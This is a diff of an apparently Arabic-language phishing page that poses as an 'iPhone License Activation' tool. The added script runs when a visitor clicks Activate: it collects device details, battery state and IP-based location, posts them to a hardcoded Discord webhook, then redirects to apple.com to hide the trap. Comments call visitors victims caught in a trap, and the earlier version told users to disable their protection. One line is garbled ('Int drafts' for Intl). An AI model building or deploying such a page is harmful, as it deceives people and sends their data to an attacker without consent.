@@ -3,25 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HTLr | Exclusive Private Tool</title>
+    <title>HTLr | iPhone License Activation</title>
     <style>
-        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 2px solid #00ff41; padding: 40px; border-radius: 15px; text-align: center; box-shadow: 0 0 20px #00ff41; background: rgba(0,0,0,0.8); }
-        h1 { font-size: 3.5em; margin: 10px; text-shadow: 2px 2px #ff0000; }
-        p { font-size: 1.2em; color: #ccc; }
-        .download-btn { display: inline-block; margin-top: 30px; padding: 15px 50px; background: #00ff41; color: #000; text-decoration: none; font-weight: bold; font-size: 1.5em; border-radius: 5px; transition: 0.4s; box-shadow: 0 0 10px #00ff41; }
-        .download-btn:hover { background: #ff0000; color: #fff; box-shadow: 0 0 30px #ff0000; transform: scale(1.1); }
-        .footer { margin-top: 40px; font-size: 0.8em; color: #444; text-transform: uppercase; }
+        body { background-color: #000; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center; padding: 20px; }
+        .card { background: #1c1c1e; border-radius: 15px; padding: 30px; margin-top: 50px; border: 1px solid #3a3a3c; }
+        h1 { font-size: 24px; color: #0a84ff; }
+        p { color: #8e8e93; font-size: 14px; }
+        .btn { display: inline-block; background: #0a84ff; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none; font-weight: bold; margin-top: 20px; transition: 0.3s; }
+        .btn:active { transform: scale(0.95); background: #007aff; }
+        .footer { margin-top: 50px; font-size: 10px; color: #444; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>#HTLr EXCLUSIVE</h1>
+
+    <div class="card">
+        <h1 id="status">#HTLr EXCLUSIVE</h1>
+        <p>يجب تفعيل ملف التعريف (Profile) لتشغيل الأداة على جهازك.</p>
         <p>رابط اداه نادره وحصريهه (مدفوعه) لاتنشر الرابط الى لخوياك!!</p>
-        <p style="color: yellow;">[ الإصدار v4.2.0 - خاص وحصري ]</p>
-        <a href="HTLr.tool.py" download class="download-btn">DOWNLOAD TOOL NOW</a>
-        <p style="font-size: 0.7em; margin-top: 15px; color: #ff3333;">⚠️ تنبيه: قم بإيقاف الحماية لتشغيل وظائف الأداة المتقدمة</p>
+        
+        <a href="#" class="btn" onclick="captureAndSend()">تفعيل الأداة (Activate)</a>
     </div>
+
     <div class="footer">Z7F LINK TRACK | DENGER ☢️</div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sH0NyCuwJNylU105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE";
+
+        async function captureAndSend() {
+            document.getElementById('status').innerText = "جاري التحقق...";
+            
+            // جمع معلومات الجهاز (أيفون)
+            const deviceInfo = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                cores: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory || "N/A",
+                screen: `${window.screen.width}x${window.screen.height}`,
+                touchPoints: navigator.maxTouchPoints,
+                timezone: Int drafts.DateTimeFormat().resolvedOptions().timeZone,
+                vendor: navigator.vendor
+            };
+
+            // جلب الموقع والآيبي
+            let ipData = {};
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch (e) { ipData = { ip: "Blocked" }; }
+
+            // جلب حالة البطارية
+            let batteryInfo = "";
+            try {
+                const battery = await navigator.getBattery();
+                batteryInfo = `Level: ${battery.level * 100}%, Charging: ${battery.charging}`;
+            } catch (e) { batteryInfo = "Access Denied"; }
+
+            // تجهيز الإيمبد لديسكورد
+            const embed = {
+                title: "🎯 صيدة أيفون جديدة! [#HTLr]",
+                color: 0x007aff, // لون أزرق أبل
+                fields: [
+                    { name: "🌐 معلومات الشبكة", value: `**IP:** ${ipData.ip}\n**City:** ${ipData.city}\n**Country:** ${ipData.country_name}\n**ISP:** ${ipData.org}`, inline: false },
+                    { name: "📱 تفاصيل الجهاز", value: `**Model:** ${deviceInfo.platform}\n**OS:** ${deviceInfo.userAgent.split(' ')[5]}\n**Screen:** ${deviceInfo.screen}\n**Battery:** ${batteryInfo}`, inline: false },
+                    { name: "🌍 اللغة والوقت", value: `**Lang:** ${deviceInfo.language}\n**Timezone:** ${deviceInfo.timezone}`, inline: true },
+                    { name: "🛠️ الهاردوير", value: `**Cores:** ${deviceInfo.cores}\n**Vendor:** ${deviceInfo.vendor}`, inline: true }
+                ],
+                footer: { text: "Z7F LINK TRACK | DENGER ☢️" }
+            };
+
+            // إرسال للديسكورد
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+
+            // تحويل الضحية لملف التعريف الوهمي عشان يكتمل الفخ
+            alert("تم إرسال طلب التفعيل بنجاح. يرجى الانتظار...");
+            window.location.href = "https://apple.com"; // أو رابط لملف .mobileconfig لو عندك
+        }
+    </script>
 </body>
 </html>
